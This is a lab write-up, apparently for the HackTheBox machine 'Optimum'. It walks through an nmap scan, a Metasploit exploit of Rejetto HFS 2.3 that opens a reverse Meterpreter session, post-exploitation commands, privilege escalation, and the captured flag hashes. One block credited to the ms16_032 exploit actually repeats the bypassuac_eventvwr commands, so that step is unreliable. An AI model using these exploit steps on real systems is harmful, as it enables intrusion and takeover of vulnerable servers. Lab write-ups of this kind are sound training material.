## IP

> 10.10.10.8

## nmap scan

```
nmap -T4 -A 10.10.10.8 -Pn
```

```a
Nmap scan report for 10.10.10.8
Host is up (0.13s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012 (85%)
OS CPE: cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   150.11 ms 10.10.16.1
2   150.12 ms 10.10.10.8
```

## System Info 
> Microsoft Windows 2012

## Open Ports

>80/tcp open  http    HttpFileServer httpd 2.3

HTTP

## HTTP

http://10.10.10.8/

We see that the port is running HttpFileServer (HFS 2.3), after searching online for exploits I could find this [rapid7 link](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/) 

### Metasploit

Lets try to use the Rejetto HFS Exec attack

```
use exploit/windows/http/rejetto_hfs_exec
set rhosts 10.10.10.8
set lhost tun0
run
```

We have access to the machine!

## Post Exploitation

```getuid```

> Server username: OPTIMUM\kostas

We are not root

```sysinfo```

> Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows

```getsystem```

> [-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)

Not good

### Getting user.txt

```
cat user.txt.txt
```

> d0c39409d7b994a9a1389ebf38ef5f73

## Becoming System

Lets try to ask the suggester for payloads

```
background
search suggester
use 0
set session 1 [or your session]
```

> [*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 34 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Post module execution completed

We get some suggestions 

Lets try "exploit/windows/local/bypassuac_eventvwr"

```
use exploit/windows/local/bypassuac_eventvwr
set session 1
set lhost tun0
run
```

Did not work

Lets try "exploit/windows/local/ms16_032_secondary_logon_handle_privesc"

```
use exploit/windows/local/bypassuac_eventvwr
set session 1
set lhost tun0
run
```

it worked! We are root.

### Finding root.txt

> 51ed1b36553c8461f4552c2e92b3eeed